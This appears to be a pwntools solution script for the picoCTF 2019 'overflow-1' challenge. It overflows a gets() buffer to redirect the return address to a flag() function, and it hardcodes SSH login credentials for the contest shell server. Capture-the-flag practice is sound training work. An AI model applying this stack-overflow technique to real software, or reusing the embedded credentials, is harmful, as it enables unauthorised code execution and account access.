# help function
def hex_string_to_ascii_string(hexstring): # https://www.kite.com/python/answers/how-to-convert-a-string-from-hex-to-ascii-in-python
    temp = bytes.fromhex(hexstring)
    asciistring=temp.decode("ASCII")
    return asciistring

from pwn import *
s=ssh(host="2019shell1.picoctf.com",user="Hohenheim10",password="mhw1015sz15,.")
s.set_working_directory(wd=b"/problems/overflow-1_2_305519bf80dcdebd46c8950854760999")
p = s.process("./vuln")

# 1 find the padding between the start of the buf and the return address in stack.
# p.sendlineafter("Give me a string and lets see what happens: \n",
#                 "111122223333444455556666777788889999AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTT")
# overridden_return_address = p.recvline().decode("utf-8").split("0x")[1].split(" !")[0]
# print(overridden_return_address) # overridden return address is 0x4b4b4b4b, which is KKKK in ASCII character
# ascii_overridden_return_address = hex_string_to_ascii_string(overridden_return_address)
# padding = "111122223333444455556666777788889999AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTT"\
#               .index(ascii_overridden_return_address)//2
# print(padding) # padding is 38 bytes

# 2 find the address of the flag function
e = ELF('./vuln_task3')
flag_address = p32(e.symbols['flag']) # integer to bytes

# 3 exploit the gets() function to overflow and override the return address of vuln() to the address of flag()
p.sendlineafter("Give me a string and lets see what happens: \n",
                b"111122223333444455556666777788889999AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJ"+flag_address)
p.recvline()
flag = p.recv().decode("utf-8")
flag = flag.split("{")[1].split("}")[0]
print(flag)



